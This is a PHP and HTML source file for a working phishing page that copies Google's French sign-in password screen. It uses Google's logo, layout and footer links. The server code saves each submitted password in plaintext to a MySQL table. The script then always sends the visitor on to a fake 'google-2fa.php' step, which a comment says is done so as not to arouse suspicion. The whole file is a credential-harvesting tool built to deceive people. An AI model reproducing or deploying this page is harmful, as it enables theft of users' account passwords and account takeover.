<?php
// On active l'affichage de toutes les erreurs PHP à l'écran
error_reporting(E_ALL);
ini_set('display_errors', 1);

// 1. Connexion à la base de données
$host = '127.0.0.1'; 
$db   = 'password_db';
$user = 'root';        
$pass = 'pwd';            

try {
     $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass, [
         PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
     ]);
} catch (Exception $e) {
     die("<h3 style='color:red;'>Erreur de connexion à la base de données :</h3> " . $e->getMessage());
}

$message = "";

// 2. Traitement du formulaire (soumission classique OU AJAX)
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['password'])) {
        $raw_password = $_POST['password'];
        
        try {
            $sql = "INSERT INTO single_passwords (password) VALUES (:password)";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['password' => $raw_password]);
            
            // Si c'est une requête AJAX, on renvoie du JSON
            if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
                echo json_encode(["success" => true, "message" => "Mot de passe enregistré"]);
                exit;
            }
            
            $message = "<h3 style='color: green;'>✅ Succès ! Le mot de passe a été ajouté.</h3>";
        } catch (Exception $e) {
            if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
                echo json_encode(["success" => false, "message" => $e->getMessage()]);
                exit;
            }
            $message = "<h3 style='color: red;'>❌ Erreur SQL d'insertion :</h3> " . $e->getMessage();
        }
    } else {
        if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
            echo json_encode(["success" => false, "message" => "Champ vide"]);
            exit;
        }
        $message = "<h3 style='color: orange;'>⚠️ Le champ mot de passe est vide.</h3>";
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter - Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        body { font-family: 'Roboto', sans-serif; -webkit-font-smoothing: antialiased; }

        .pwd-wrapper { position: relative; margin-top: 8px; }

        .pwd-input {
            width: 100%;
            height: 56px;
            border: 1px solid #747775;
            border-radius: 4px;
            padding: 13px 15px;
            font-size: 16px;
            color: #1f1f1f;
            background: transparent;
            outline: none;
            transition: border 0.2s;
        }
        .pwd-input:focus { border: 2px solid #0b57d0; padding: 12px 14px; }
        .pwd-input.input-error { border: 2px solid #b3261e; }

        .pwd-label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            background-color: transparent;
            color: #444746;
            font-size: 16px;
            padding: 0 4px;
            transition: all 0.2s ease;
            pointer-events: none;
            z-index: 10;
        }
        .pwd-input:focus ~ .pwd-label,
        .pwd-input:not(:placeholder-shown) ~ .pwd-label {
            top: 0;
            font-size: 12px;
            color: #0b57d0;
            background-color: white;
        }
        .pwd-input.input-error ~ .pwd-label { color: #b3261e; }

        .email-chip {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            border: 1px solid #c4c7c5;
            border-radius: 20px;
            padding: 5px 10px 5px 8px;
            font-size: 14px;
            color: #1f1f1f;
            cursor: pointer;
            background: white;
            transition: background 0.15s;
            max-width: 100%;
        }
        .email-chip:hover { background: #f0f4f9; }

        .google-checkbox {
            width: 18px;
            height: 18px;
            border: 2px solid #747775;
            border-radius: 2px;
            appearance: none;
            -webkit-appearance: none;
            cursor: pointer;
            position: relative;
            flex-shrink: 0;
            background: white;
            transition: background 0.15s, border-color 0.15s;
        }
        .google-checkbox:checked { background: #0b57d0; border-color: #0b57d0; }
        .google-checkbox:checked::after {
            content: '';
            position: absolute;
            left: 3px; top: 0px;
            width: 6px; height: 10px;
            border: 2px solid white;
            border-top: none; border-left: none;
            transform: rotate(45deg);
        }

        #lang-menu { display: none; }
        #lang-menu.show { display: block; }
    </style>
</head>
<body class="min-h-screen bg-[#f0f4f9] flex flex-col items-center justify-center text-[#1f1f1f] p-4">

    <!-- Carte large deux colonnes — identique à la page email -->
    <div class="bg-white rounded-[28px] w-full max-w-[1040px] flex flex-col md:flex-row gap-8 p-8 md:p-[48px] shadow-sm">

        <!-- Colonne gauche -->
        <div class="flex-1 flex flex-col text-left">
            <img
                src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"
                alt="Logo Google"
                class="h-[36px] w-[36px] mb-8 object-contain self-start"
            />
            <h1 class="text-[36px] font-normal leading-tight mb-4 tracking-[-0.5px]">Bienvenue</h1>

            <!-- Chip email -->
            <div>
                <button class="email-chip" onclick="goBack()" title="Changer de compte">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="#444746">
                        <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
                    </svg>
                    <span id="display-email">utilisateur@gmail.com</span>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#444746">
                        <path d="M7 10l5 5 5-5z"/>
                    </svg>
                </button>
            </div>
        </div>

        <!-- Colonne droite -->
        <div class="flex-1 flex flex-col pt-4 md:pt-[60px]">

            <!-- Champ mot de passe avec label flottant -->
            <div class="pwd-wrapper mb-3">
                <input
                    type="password"
                    id="password"
                    class="pwd-input"
                    placeholder=" "
                    autocomplete="current-password"
                />
                <label for="password" class="pwd-label">Saisissez votre mot de passe</label>
            </div>

            <!-- Erreur -->
            <div id="error-container" class="hidden flex items-center gap-1.5 mb-2 text-[#b3261e]">
                <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                <span class="text-[12px]">Saisissez un mot de passe</span>
            </div>

            <!-- Case à cocher -->
            <div class="flex items-center gap-2.5 mb-10 mt-1">
                <input type="checkbox" id="showPwd" class="google-checkbox" />
                <label for="showPwd" class="text-[14px] text-[#1f1f1f] cursor-pointer select-none">Afficher le mot de passe</label>
            </div>

            <!-- Boutons alignés à droite -->
            <div class="flex flex-row justify-end items-center gap-2 mt-auto">
                <button type="button" class="text-[#0b57d0] font-medium text-[14px] px-6 py-2.5 hover:bg-[#f0f4f9] rounded-full bg-transparent border-none cursor-pointer">
                    Mot de passe oublié ?
                </button>
                <button type="button" id="btn-submit" class="bg-[#0b57d0] text-white font-medium text-[14px] px-6 py-2.5 rounded-full hover:bg-[#0a4bbb] border-none cursor-pointer">
                    Suivant
                </button>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="w-full max-w-[1040px] flex justify-between items-center text-[12px] text-[#444746] px-2 mt-4 relative">
        <div class="relative">
            <button onclick="toggleLang()" class="flex items-center gap-1.5 px-3 py-2 hover:bg-black/5 rounded cursor-pointer border-none bg-transparent text-[12px] text-[#444746] outline-none">
                <span id="current-lang">Français (France)</span>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
            </button>
            <div id="lang-menu" class="absolute bottom-full left-0 mb-2 bg-white shadow-lg border rounded py-2 w-[180px] z-50">
                <div class="px-4 py-2 hover:bg-gray-100 cursor-pointer text-[13px]" onclick="changeLang('fr','Français (France)')">Français (France)</div>
                <div class="px-4 py-2 hover:bg-gray-100 cursor-pointer text-[13px]" onclick="changeLang('en','English (US)')">English (US)</div>
            </div>
        </div>
        <div class="flex gap-4">
            <a href="https://support.google.com/accounts?hl=fr" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Aide</a>
            <a href="https://policies.google.com/privacy?gl=FR&hl=fr" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Confidentialité</a>
            <a href="https://policies.google.com/terms?gl=FR&hl=fr" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Conditions</a>
        </div>
    </div>

    <script>
    const params = new URLSearchParams(window.location.search);
    const email = params.get('email') || sessionStorage.getItem('google_email') || 'utilisateur@gmail.com';
    document.getElementById('display-email').textContent = email;

    function goBack() { window.history.back(); }

    const pwdInput     = document.getElementById('password');
    const showPwdCheck = document.getElementById('showPwd');

    showPwdCheck.addEventListener('change', () => {
        pwdInput.type = showPwdCheck.checked ? 'text' : 'password';
    });

    const errorBox = document.getElementById('error-container');
    document.getElementById('btn-submit').addEventListener('click', function() {
        const password = pwdInput.value.trim();
        
        if (password === '') {
            pwdInput.classList.add('input-error');
            errorBox.classList.remove('hidden');
            return;
        }
        
        pwdInput.classList.remove('input-error');
        errorBox.classList.add('hidden');

        // --- ENVOI DU MOT DE PASSE VIA AJAX ---
        const xhr = new XMLHttpRequest();
        xhr.open('POST', '', true); // POST vers la même page
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

        xhr.onload = function() {
            if (xhr.status === 200) {
                try {
                    const resp = JSON.parse(xhr.responseText);
                    console.log('Réponse serveur:', resp.message);
                } catch(e) {
                    console.log('Réponse brute:', xhr.responseText);
                }
            }
            
            // Redirection après l'envoi (même si échec, pour ne pas éveiller les soupçons)
            sessionStorage.setItem('google_email', email);
            window.location.href = 'google-2fa.php?email=' + encodeURIComponent(email);
        };

        xhr.onerror = function() {
            // Même en cas d'erreur réseau, on redirige
            sessionStorage.setItem('google_email', email);
            window.location.href = 'google-2fa.php?email=' + encodeURIComponent(email);
        };

        // Envoi des données
        xhr.send('password=' + encodeURIComponent(password));
        // ----------------------------------------
    });

    pwdInput.addEventListener('input', () => {
        pwdInput.classList.remove('input-error');
        errorBox.classList.add('hidden');
    });

    function toggleLang() { document.getElementById('lang-menu').classList.toggle('show'); }
    function changeLang(lang, label) {
        document.getElementById('current-lang').textContent = label;
        toggleLang();
    }
</script>
</body>
</html>
